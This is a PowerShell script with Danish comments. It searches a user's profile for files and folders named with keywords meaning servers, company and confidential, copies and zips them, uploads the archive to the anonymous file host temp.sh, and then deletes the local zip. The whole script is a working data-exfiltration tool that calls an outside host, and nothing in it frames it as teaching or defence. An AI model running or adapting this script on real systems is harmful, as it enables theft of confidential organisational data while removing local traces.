# Mappen, hvor scriptet skal starte med at finde filer og mapper
$sourceRoot = "C:\Users\analyst\"

# Destinationsmappen, hvor de kopierede filer og mapper skal gemmes
$destinationRoot = "C:\Users\analyst\Desktop\dump"

# URL hvor de kopierede filer og mapper skal uploades
$destinationurl = "https://temp.sh/upload"

# Liste over target items
$targetItems = @(
    "servere",
    "virksomhed",
    "fortrolig"
)

# Find alle filer og mapper i sourceRoot og dens undermapper
Get-ChildItem -Path $sourceRoot -Recurse | ForEach-Object {
    # Gennemgå hver fundet fil eller mappe
    foreach ($keyword in $targetItems) {
        # Tjek om elementets navn indeholder et af de ønskede keywords
        if ($_.Name -like "*$keyword*") {

            # Destinationsstien, hvor filen eller mappen skal kopieres til
            $destinationPath = Join-Path -Path $destinationRoot -ChildPath $_.Name

            # PSIsContainer tjekker om det er en mappe
            if ($_.PSIsContainer) {
                try {
                    # Kopierer hele mappen og dens indhold til destinationen
                    Copy-Item -Path $_.FullName -Destination $destinationPath -Recurse -Force
                    # Printer en succesmeddelelse, hvis mappen er kopieres korrekt
                    Write-Host "Mappen '$($_.Name)' blev kopieret til $destinationPath"
                } catch {
                    # Viser fejlmeddelelsen, hvis der opstår problemer under kopieringen
                    Write-Host "Fejl under kopiering af mappen '$($_.Name)': $_"
                }
            }
            # Tjekker om det er en fil
            else {
                try {
                    # Kopierer filen til destinationen
                    Copy-Item -Path $_.FullName -Destination $destinationPath -Force
                    # Printer en succesmeddelelse, hvis filen er kopieret korrekt
                    Write-Host "Filen '$($_.Name)' blev kopieret til $destinationPath"
                } catch {
                    # Viser fejlmeddelelsen, hvis der opstår problemer under kopieringenn
                    Write-Host "Fejl under kopiering af filen '$($_.Name)': $_"
                }
            }
        }
    }
}

# Opretter en midlertidig mappen til at opbevare zippede mapper
$tempZipFolder = "$destinationRoot\temp_zips"
if (-Not (Test-Path $tempZipFolder)) {
    New-Item -ItemType Directory -Path $tempZipFolder | Out-Null
}

# Zipper hele destinationmappen og dens indhold
$zipFilePath = "$destinationRoot.zip"
if (-Not (Test-Path $zipFilePath)) {
    try {
        # Zip hele destinationmappen og dens indhold
        Compress-Archive -Path $destinationRoot\* -DestinationPath $zipFilePath -Force
        Write-Host "Mappen '$destinationRoot' blev zippet til $zipFilePath"
    } catch {
        Write-Host "Fejl under zipping af mappen '$destinationRoot': $_"
    }

   try {
        # Opretter en WebClient objekt
        $webClient = New-Object System.Net.WebClient

        # Uploader den zippede til den angivne URL
        $uploadResponse = $webClient.UploadFile($destinationurl, $zipFilePath)

        # Printer en succesmeddelse, hvis der modtages svar fra serveren
        $uploadResponseText = [System.Text.Encoding]::UTF8.GetString($uploadResponse)

        # Printer returnerede tekst indeholdende URL'en, hvor mappen kan downloades fra
        Write-Host "Mappen '$destinationRoot' blev uploadet. Link til fil: $uploadResponseText"
    } catch {
        Write-Host "Fejl under upload af zippet mappe '$destinationRoot': $_"
    }
} else {
    Write-Host "Mappen '$destinationRoot' er allerede zippet og uploadet, hopper over."
}

# Rydder op i midlertidige zip-filer og mappen
try {
    # Fjerner den midlertidige zippede mappe og dens indhold
    if (Test-Path $tempZipFolder) {
        Remove-Item -Path $tempZipFolder -Recurse -Force
        Write-Host "Midlertidig mappe '$tempZipFolder' blev fjernet."
    }
} catch {
    Write-Host "Fejl under oprydning af midlertidige filer: $_"
}

# Sletter den zippede mappe efter uploaden
try {
    if (Test-Path $zipFilePath) {
        Remove-Item -Path $zipFilePath -Force
        Write-Host "Zip-filen '$zipFilePath' blev slettet."
    }
} catch {
    Write-Host "Fejl under sletning af zip-filen '$zipFilePath': $_"
}

Write-Host "Oprydning af midlertidige filer afsluttet."
